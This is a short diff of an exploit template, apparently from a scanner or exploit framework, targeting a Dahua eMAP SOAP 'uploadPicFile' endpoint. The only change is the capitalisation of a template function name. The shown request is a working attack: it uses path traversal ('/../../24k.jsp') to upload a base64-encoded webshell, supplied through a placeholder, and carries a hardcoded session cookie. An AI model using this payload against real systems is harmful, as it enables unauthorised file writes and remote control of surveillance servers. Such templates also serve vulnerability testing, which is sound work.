@@ -15,7 +15,7 @@
   "exp": {
     "step1": {
       "expGet": "/emap/webservice/gis/soap/poi",
-      "expPost": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <res:uploadPicFile>\n         <!--type: string-->\n         <arg0>/../../24k.jsp</arg0>\n         <!--type: base64Binary-->\n         <arg1>{webshell:base64Encode:1}</arg1>\n      </res:uploadPicFile>\n   </soapenv:Body>\n</soapenv:Envelope>",
+      "expPost": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <res:uploadPicFile>\n         <!--type: string-->\n         <arg0>/../../24k.jsp</arg0>\n         <!--type: base64Binary-->\n         <arg1>{webshell:Base64Encode:1}</arg1>\n      </res:uploadPicFile>\n   </soapenv:Body>\n</soapenv:Envelope>",
       "header": {
         "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
         "User-Agent": "Mozilla/5.0 (Linux;",
